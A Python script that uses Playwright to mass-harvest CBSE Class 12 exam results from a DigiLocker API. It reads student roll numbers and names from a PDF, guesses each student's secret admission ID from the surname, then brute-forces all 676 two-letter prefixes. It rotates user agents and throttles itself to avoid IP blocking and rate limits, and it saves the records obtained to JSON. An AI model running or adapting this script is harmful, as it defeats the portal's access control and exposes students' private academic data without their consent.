import asyncio
import json
import random
import pdfplumber
from playwright.async_api import async_playwright

# --- CONFIGURATION ---
PDF_PATH = "PRACTICAL.pdf"
CONCURRENT_STUDENTS = 2  # Keep low to avoid IP blocking
BATCH_SIZE = 10          
BATCH_DELAY = 3500       

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
]

def extract_students_from_pdf(path):
    students = []
    with pdfplumber.open(path) as pdf:
        # Tables start on Page 4 (index 3) [cite: 31]
        for page in pdf.pages[3:]:
            table = page.extract_table()
            if not table: continue
            for row in table[1:]:
                if row and len(row) >= 3:
                    roll = str(row[1]).strip().replace("\n", "")
                    name = str(row[2]).strip().replace("\n", " ")
                    if roll.isdigit() and len(roll) == 8:
                        students.append({"roll": roll, "name": name})
    return students

async def scrape_student(context, student, semaphore):
    async with semaphore:
        page = await context.new_page()
        await page.set_extra_http_headers({"User-Agent": random.choice(USER_AGENTS)})
        try:
            await page.goto("https://results.digilocker.gov.in/CBSE12th2026resultXIInruew.html", timeout=60000)
            
            result = await page.evaluate(f"""async () => {{
                const roll = "{student['roll']}";
                const fullName = "{student['name']}";
                const suffix = roll.slice(-2);
                
                const tryID = async (id) => {{
                    const res = await fetch("https://results.digilocker.gov.in/api/cbse/hscer/results", {{
                        method: "POST",
                        headers: {{"Content-Type": "application/x-www-form-urlencoded"}},
                        body: `rroll=${{roll}}&year=2026&admn_id=${{id}}`
                    }});
                    if (res.status === 429) return "LIMIT";
                    const data = await res.json();
                    return (data && !data.error) ? data : null;
                }};

                // Phase 1: Targeted Guess (Last 2 letters of Last Name)
                const parts = fullName.trim().split(" ");
                const last = parts[parts.length - 1];
                if (last.length >= 2) {{
                    const id = last.slice(-2).toUpperCase() + suffix + "4090";
                    const data = await tryID(id);
                    if (data && data !== "LIMIT") return data;
                }}

                // Phase 2: Brute Force Fallback
                const alpha = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".split("");
                for (let i = 0; i < 676; i += {BATCH_SIZE}) {{
                    const batch = [];
                    for (let j = 0; j < {BATCH_SIZE} && (i+j) < 676; j++) {{
                        const pre = alpha[Math.floor((i+j)/26)] + alpha[(i+j)%26];
                        batch.push(tryID(pre + suffix + "4090"));
                    }}
                    const resps = await Promise.all(batch);
                    for (const r of resps) {{
                        if (r === "LIMIT") await new Promise(ok => setTimeout(ok, 10000));
                        else if (r) return r;
                    }}
                    await new Promise(ok => setTimeout(ok, {BATCH_DELAY}));
                }}
                return null;
            }}""")
            await page.close()
            if result: print(f"✅ Found: {student['name']}")
            return result
        except:
            await page.close()
            return None

async def main():
    students = extract_students_from_pdf(PDF_PATH)
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context()
        sem = asyncio.Semaphore(CONCURRENT_STUDENTS)
        results = await asyncio.gather(*[scrape_student(context, s, sem) for s in students])
        with open('results_data.json', 'w') as f:
            json.dump([r for r in results if r], f, indent=4)
        await browser.close()

if __name__ == "__main__": asyncio.run(main())